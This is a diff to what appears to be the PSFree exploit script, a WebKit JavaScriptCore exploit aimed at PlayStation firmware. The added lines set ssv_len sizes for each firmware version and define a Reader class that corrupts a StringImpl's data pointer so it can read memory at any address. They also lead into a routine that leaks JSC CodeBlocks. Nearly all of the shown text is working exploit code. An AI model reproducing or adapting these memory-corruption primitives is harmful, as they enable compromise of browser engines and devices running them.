@@ -34,13 +34,61 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
 //     needed offsets on different firmwares (PS5).
 
 const num_reuses = 0x300;
+
+var ssv_len;
+
+function Init_PSFreeGlobals() {
+  if (config_target < 0x650)
+    ssv_len = 0x58;
+  else if (config_target < 0x900)
+    ssv_len = 0x48;
+  else
+    ssv_len = 0x50;
+}
+
+function sread64(str, offset) {
+  const low = str.charCodeAt(offset) | (str.charCodeAt(offset + 1) << 8) | (str.charCodeAt(offset + 2) << 16) | (str.charCodeAt(offset + 3) << 24);
+  const high = str.charCodeAt(offset + 4) | (str.charCodeAt(offset + 5) << 8) | (str.charCodeAt(offset + 6) << 16) | (str.charCodeAt(offset + 7) << 24);
+  return new Int(low, high);
+}
+
+class Reader {
+  constructor(rstr, rstr_view) {
+    this.rstr = rstr;
+    this.rstr_view = rstr_view;
+    this.m_data = rstr_view.read64(off_strimpl_m_data);
+  }
+  read8_at(offset) {
+    return this.rstr.charCodeAt(offset);
+  }
+  read32_at(offset) {
+    const str = this.rstr;
+    return (str.charCodeAt(offset) | (str.charCodeAt(offset + 1) << 8) | (str.charCodeAt(offset + 2) << 16) | (str.charCodeAt(offset + 3) << 24)) >>> 0;
+  }
+  read64_at(offset) {
+    return sread64(this.rstr, offset);
+  }
+  read64(addr) {
+    this.rstr_view.write64(off_strimpl_m_data, addr);
+    return sread64(this.rstr, 0);
+  }
+  set_addr(addr) {
+    this.rstr_view.write64(off_strimpl_m_data, addr);
+  }
+  // remember to use this to fix up the StringImpl before freeing it
+  restore() {
+    this.rstr_view.write64(off_strimpl_m_data, this.m_data);
+    const original_strlen = ssv_len - off_size_strimpl;
+    this.rstr_view.write32(off_strimpl_strlen, original_strlen);
+  }
+}
+//================================================================================================
+// LEAK CODE BLOCK ===============================================================================
+//================================================================================================
 // we will create a JSC::CodeBlock whose m_constantRegisters is set to an array
 // of JSValues whose size is ssv_len. the undefined constant is automatically
 // added due to reasons such as "undefined is returned by default if the
 // function exits without returning anything"
-//================================================================================================
-// LEAK CODE BLOCK ===============================================================================
-//================================================================================================
 async function leak_code_block(reader, bt_size) {
   const num_leaks = 0x100;
   const rdr = reader;
